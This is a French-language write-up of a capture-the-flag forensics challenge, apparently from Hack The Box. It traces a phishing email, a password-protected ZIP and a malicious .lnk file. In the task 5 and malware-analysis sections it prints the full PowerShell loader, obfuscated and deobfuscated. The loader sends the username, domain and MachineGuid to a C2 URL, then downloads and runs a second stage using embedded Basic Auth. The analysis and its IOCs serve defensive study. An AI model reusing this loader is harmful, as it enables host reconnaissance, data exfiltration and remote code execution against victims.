@@ -1,0 +1,514 @@
+---
+title: AoTR
+description: WU AoTR - Sherlock
+categories: [Writeup]
+tags: [writeup, forensics]
+template: doc
+sidebar:
+  order: 5
+  badge:
+    text: 'easy'
+    variant: success
+---
+
+## Scenario
+
+Un employe du musee recoit un email urgent concernant des mises a jour de conformite sanitaire pour un evenement transfrontalier. L'email contient une archive ZIP protegee par mot de passe avec un fichier .lnk malveillant qui execute un script PowerShell. L'objectif est d'analyser l'email et le malware pour identifier la chaine d'infection.
+
+## Fichiers fournis
+
+- `URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml` - L'email de phishing
+- `Part 1 - A Call from the Museum.pdf` - Contexte du challenge
+
+---
+
+## Tache 1 : Who is the suspicious sender of the email?
+
+**Reponse** : `eu-health@ca1e-corp.org`
+
+**Etapes** :
+
+1. Ouvrir le fichier `.eml` et lire les headers :
+```shell wrap
+head -50 "URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml"
+```
+
+2. Chercher l'en-tete `From` :
+```
+From: EU Health Logistics Office <eu-health@ca1e-corp.org>
+```
+
+**Note** : Le domaine `ca1e-corp.org` est du typosquatting de `cale-corp.org` (le `l` est remplace par `1`).
+
+---
+
+## Tache 2 : What is the legitimate server that initially sent the email?
+
+**Reponse** : `BG1P293CU004.outbound.protection.outlook.com`
+
+**Etapes** :
+
+1. Chercher les en-tetes `Received` dans le fichier `.eml` :
+```shell wrap
+grep -i "^Received:" "URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml"
+```
+
+2. Le premier `Received` indique le serveur d'origine :
+```shell wrap
+Received: from BG1P293CU004.outbound.protection.outlook.com
+ (mail-serbianorthazon11020077.outbound.protection.outlook.com [52.101.176.77])
+```
+
+---
+
+## Tache 3 : What is the attachment filename?
+
+**Reponse** : `Health_Clearance-December_Archive.zip`
+
+**Etapes** :
+
+1. Chercher l'en-tete `X-Attached` ou `Content-Disposition` :
+```shell wrap
+grep -i "X-Attached\|filename=" "URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml"
+```
+
+2. Resultat :
+```
+X-Attached: Health_Clearance-December_Archive.zip
+Content-Disposition: attachment; filename="Health_Clearance-December_Archive.zip"
+```
+
+---
+
+## Tache 4 : What is the Document Code?
+
+**Reponse** : `EU-HMU-24X`
+
+**Etapes** :
+
+### 4.1 Extraire la piece jointe de l'email
+
+Le corps de l'email est en HTML encode en base64. La piece jointe est aussi encodee en base64.
+
+```python
+import email
+from email import policy
+from email.parser import BytesParser
+import os
+
+os.makedirs('extracted', exist_ok=True)
+
+with open('URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml', 'rb') as f:
+    msg = BytesParser(policy=policy.default).parse(f)
+
+for part in msg.walk():
+    filename = part.get_filename()
+    if filename:
+        print(f"[+] Piece jointe trouvee: {filename}")
+        content = part.get_payload(decode=True)
+        with open(f'extracted/{filename}', 'wb') as out:
+            out.write(content)
+        print(f"[+] Sauvegarde dans: extracted/{filename}")
+```
+
+### 4.2 Trouver le mot de passe de l'archive
+
+Le mot de passe est dans le corps HTML de l'email. On peut le decoder :
+
+```python
+import email
+from email import policy
+from email.parser import BytesParser
+
+with open('URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml', 'rb') as f:
+    msg = BytesParser(policy=policy.default).parse(f)
+
+for part in msg.walk():
+    if part.get_content_type() == 'text/html':
+        html = part.get_payload(decode=True).decode('utf-8')
+        if 'password' in html.lower():
+            import re
+            match = re.search(r'Archive password.*?<[^>]*>([^<]+)<', html, re.IGNORECASE | re.DOTALL)
+            if match:
+                print(f"[+] Mot de passe trouve: {match.group(1)}")
+```
+
+**Mot de passe trouve** : `**REDACTED**`
+
+### 4.3 Extraire l'archive ZIP
+
+```bash
+cd extracted
+unzip -P '**REDACTED**' Health_Clearance-December_Archive.zip
+```
+
+**Fichiers extraits** :
+- `EU_Health_Compliance_Portal.lnk` (fichier malveillant)
+- `Health_Clearance_Guidelines.pdf` (document leurre)
+
+### 4.4 Lire le PDF pour trouver le Document Code
+
+```bash
+# Option 1: Ouvrir le PDF avec un lecteur
+open Health_Clearance_Guidelines.pdf
+
+# Option 2: Extraire le texte avec pdftotext
+pdftotext Health_Clearance_Guidelines.pdf - | head -20
+```
+
+**Le Document Code est dans le sous-titre** :
+```shell wrap
+European Cross-Border Festive Operations - Document Code EU-HMU-24X - December Cycle
+```
+
+---
+
+## Tache 5 : What is the full URL of the C2 contacted through a POST request?
+
+**Reponse** : `https://health-status-rs.com/api/v1/checkin`
+
+**Etapes** :
+
+### 5.1 Analyser le fichier LNK malveillant
+
+Les fichiers `.lnk` Windows contiennent des arguments de commande. On extrait les chaines Unicode :
+
+```python
+with open('EU_Health_Compliance_Portal.lnk', 'rb') as f:
+    data = f.read()
+
+print("[+] Extraction des chaines Unicode du fichier LNK...\n")
+
+i = 0
+while i < len(data) - 2:
+    if data[i] >= 0x20 and data[i] < 0x7f and data[i+1] == 0:
+        chars = []
+        while i < len(data) - 1 and data[i] >= 0x20 and data[i] < 0x7f and data[i+1] == 0:
+            chars.append(chr(data[i]))
+            i += 2
+        s = ''.join(chars)
+        if len(s) > 50:
+            print(s)
+            print("-" * 60)
+    else:
+        i += 1
+```
+
+### 5.2 Script PowerShell extrait
+
+On trouve la commande PowerShell obfusquee :
+
+```shell wrap
+-nONi -nOp -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));saps .\Health_Clearance_Guidelines.pdf;$AX=$env:USERNAME;$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');$Bz=$env:USERDOMAIN;$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;$pP = @{u=$AX;d=$Bz;g=$Mw};$Zu=(iwr $oM -Method POST -Body $pP).Content;$Hd = @{Authorization = $Bs };iwr -Headers $Hd $Lj$Zu | iex;"
+```
+
+### 5.3 Decoder l'URL C2
+
+L'URL est encodee en URL-encoding :
+
+```bash
+python3 -c "
+import urllib.parse
+url_encoded = 'https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin'
+print(urllib.parse.unquote(url_encoded))
+"
+```
+
+**Resultat** : `https://health-status-rs.com/api/v1/checkin`
+
+---
+
+## Tache 6 : The malicious script sent three pieces of information in the POST request. What is the registry key from which the last one is retrieved?
+
+**Reponse** : `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`
+
+**Etapes** :
+
+Dans le script PowerShell, on identifie les 3 variables envoyees dans le POST :
+
+```powershell
+$AX = $env:USERNAME                                              # 1ere info
+$Bz = $env:USERDOMAIN                                            # 2eme info
+$Mw = (gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid     # 3eme info
+
+$pP = @{u=$AX; d=$Bz; g=$Mw}   # Corps du POST
+$Zu = (iwr $oM -Method POST -Body $pP).Content
+```
+
+| Variable | Cle POST | Valeur | Source |
+|----------|----------|--------|--------|
+| `$AX` | `u` | Nom d'utilisateur | `$env:USERNAME` |
+| `$Bz` | `d` | Domaine | `$env:USERDOMAIN` |
+| `$Mw` | `g` | GUID machine | Registre Windows |
+
+La 3eme info (`g`) vient de la cle : `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`
+
+---
+
+## Tache 7 : Then the script downloads and executes a second stage from another URL. What is the domain?
+
+**Reponse** : `advent-of-the-relics-forum.htb.blue`
+
+**Etapes** :
+
+### 7.1 Identifier l'URL du second stage dans le script
+
+```shell wrap
+$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D')
+```
+
+### 7.2 Decoder l'URL
+
+```bash
+python3 -c "
+import urllib.parse
+url_encoded = 'https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D'
+url = urllib.parse.unquote(url_encoded)
+print(f'URL complete: {url}')
+print(f'Domaine: {url.split(\"/\")[2]}')
+"
+```
+
+**Resultat** :
+- URL complete : `https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=`
+- Domaine : `advent-of-the-relics-forum.htb.blue`
+
+---
+
+## Tache 8 : A set of credentials was used to access the previous resource. Retrieve them.
+
+**Reponse** : `**REDACTED_CREDENTIALS**`
+
+**Etapes** :
+
+### 8.1 Identifier les credentials dans le script
+
+Regardons le **debut** du script :
+
+```powershell
+$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'))
+```
+
+Et la **fin** du script :
+
+```powershell
+$Hd = @{Authorization = $Bs }
+iwr -Headers $Hd $Lj$Zu | iex
+```
+
+**Explication** :
+- `$Bs` contient le header d'authentification HTTP "Basic Auth"
+- Il est utilise dans `$Hd = @{Authorization = $Bs}` pour s'authentifier au second stage
+- L'attaquant a **decoupe la chaine en fragments** pour eviter la detection (obfuscation)
+
+### 8.2 Comprendre l'obfuscation
+
+La fonction PowerShell `-join()` concatene tous les fragments :
+
+```
+'Basic c3' + 'ZjX3Rlb' + 'XA6U2' + '5' + 'vd0JsY' + 'WNrT' + '3V' + '0X' + 'zIwM' + 'jYh'
+                                    |
+                    'Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh'
+```
+
+Le format `Basic <base64>` est le standard HTTP Basic Authentication.
+
+### 8.3 Decoder le Base64
+
+```python
+import base64
+
+# Les fragments viennent DIRECTEMENT du script PowerShell extrait du LNK
+fragments = ['Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh']
+
+# Etape 1 : Reconstruire (ce que fait -join() en PowerShell)
+full_header = ''.join(fragments)
+print(f"[1] Header reconstitue: {full_header}")
+
+# Etape 2 : Extraire la partie Base64 (apres "Basic ")
+b64_part = full_header.replace("Basic ", "")
+print(f"[2] Partie Base64: {b64_part}")
+
+# Etape 3 : Decoder le Base64
+credentials = base64.b64decode(b64_part).decode()
+print(f"[3] Credentials decodes: {credentials}")
+
+# Etape 4 : Separer username:password
+username, password = credentials.split(':')
+print(f"\n[+] Username: {username}")
+print(f"[+] Password: {password}")
+```
+
+**Resultat** :
+```
+[1] Header reconstitue: Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh
+[2] Partie Base64: c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh
+[3] Credentials decodes: **REDACTED_CREDENTIALS**
+
+[+] Username: svc_temp
+[+] Password: **REDACTED**
+```
+
+### 8.4 Resume visuel
+
+```
+Script PowerShell (extrait du LNK)
+         |
+         v
+$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'))
+         |
+         |  -join() concatene les fragments
+         v
+"Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh"
+         |
+         |  Enlever "Basic "
+         v
+"c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh"
+         |
+         |  Decoder Base64
+         v
+"**REDACTED_CREDENTIALS**"
+         |
+         |  Separer par ":"
+         v
+Username: svc_temp
+Password: **REDACTED**
+```
+
+---
+
+## Analyse du malware
+
+### Chaine d'infection
+
+```
+1. Email phishing
+   +-- Piece jointe: Health_Clearance-December_Archive.zip (mot de passe: **REDACTED**)
+       |-- Health_Clearance_Guidelines.pdf (leurre)
+       +-- EU_Health_Compliance_Portal.lnk (malveillant)
+           +-- Execute PowerShell
+               |-- Ouvre le PDF leurre
+               |-- Collecte infos systeme (USERNAME, USERDOMAIN, MachineGuid)
+               |-- POST vers C2: health-status-rs.com
+               +-- Telecharge et execute second stage depuis advent-of-the-relics-forum.htb.blue
+```
+
+### Script PowerShell deobfusque
+
+```powershell
+# Header Basic Auth (obfusque en fragments)
+$Bs = "Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh"
+
+# Ouvre le PDF leurre
+Start-Process .\Health_Clearance_Guidelines.pdf
+
+# Collecte 3 infos systeme
+$AX = $env:USERNAME
+$Bz = $env:USERDOMAIN
+$Mw = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
+
+# Envoie POST au C2
+$pP = @{u=$AX; d=$Bz; g=$Mw}
+$Zu = (Invoke-WebRequest "https://health-status-rs.com/api/v1/checkin" -Method POST -Body $pP).Content
+
+# Telecharge et execute le second stage avec Basic Auth
+$Hd = @{Authorization = $Bs}
+Invoke-WebRequest -Headers $Hd "https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=$Zu" | Invoke-Expression
+```
+
+---
+
+## Indicateurs de compromission (IOCs)
+
+| Type | Valeur |
+|------|--------|
+| Email (expediteur) | `eu-health@ca1e-corp.org` |
+| Domaine (typosquatting) | `ca1e-corp.org` |
+| Domaine (C2) | `health-status-rs.com` |
+| Domaine (stage 2) | `advent-of-the-relics-forum.htb.blue` |
+| URL (C2 POST) | `https://health-status-rs.com/api/v1/checkin` |
+| URL (stage 2) | `https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=` |
+| Fichier | `Health_Clearance-December_Archive.zip` |
+| Fichier | `EU_Health_Compliance_Portal.lnk` |
+| Fichier | `Health_Clearance_Guidelines.pdf` |
+| Credentials | `**REDACTED_CREDENTIALS**` |
+| Registry Key | `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid` |
+
+---
+
+## Commandes utiles
+
+```bash
+# 1. Extraire les pieces jointes de l'email
+python3 -c "
+import email
+from email import policy
+from email.parser import BytesParser
+import os
+
+os.makedirs('extracted', exist_ok=True)
+with open('URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml', 'rb') as f:
+    msg = BytesParser(policy=policy.default).parse(f)
+
+for part in msg.walk():
+    filename = part.get_filename()
+    if filename:
+        content = part.get_payload(decode=True)
+        with open(f'extracted/{filename}', 'wb') as f:
+            f.write(content)
+        print(f'Extracted: {filename}')
+"
+
+# 2. Extraire l'archive protegee par mot de passe
+cd extracted
+unzip -P '**REDACTED**' Health_Clearance-December_Archive.zip
+
+# 3. Extraire les chaines Unicode du fichier LNK
+python3 -c "
+with open('EU_Health_Compliance_Portal.lnk', 'rb') as f:
+    data = f.read()
+
+i = 0
+while i < len(data) - 2:
+    if data[i] >= 0x20 and data[i] < 0x7f and data[i+1] == 0:
+        chars = []
+        while i < len(data) - 1 and data[i] >= 0x20 and data[i] < 0x7f and data[i+1] == 0:
+            chars.append(chr(data[i]))
+            i += 2
+        s = ''.join(chars)
+        if len(s) > 20:
+            print(s)
+    else:
+        i += 1
+"
+
+# 4. Decoder les URLs et credentials
+python3 -c "
+import urllib.parse
+import base64
+
+# URL C2
+print('C2 URL:', urllib.parse.unquote('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin'))
+
+# URL stage 2
+print('Stage 2:', urllib.parse.unquote('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D'))
+
+# Credentials
+b64 = 'c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh'
+print('Credentials:', base64.b64decode(b64).decode())
+"
+```
+
+---
+
+## Techniques MITRE ATT&CK
+
+| ID | Technique | Description |
+|----|-----------|-------------|
+| T1566.001 | Phishing: Spearphishing Attachment | Email avec piece jointe malveillante |
+| T1204.002 | User Execution: Malicious File | Execution du fichier .lnk par l'utilisateur |
+| T1059.001 | Command and Scripting Interpreter: PowerShell | Execution de script PowerShell |
+| T1027 | Obfuscated Files or Information | URLs encodees, Basic Auth fragmente |
+| T1082 | System Information Discovery | Collecte USERNAME, USERDOMAIN, MachineGuid |
+| T1071.001 | Application Layer Protocol: Web Protocols | Communication C2 via HTTPS |
+| T1105 | Ingress Tool Transfer | Telechargement du second stage |
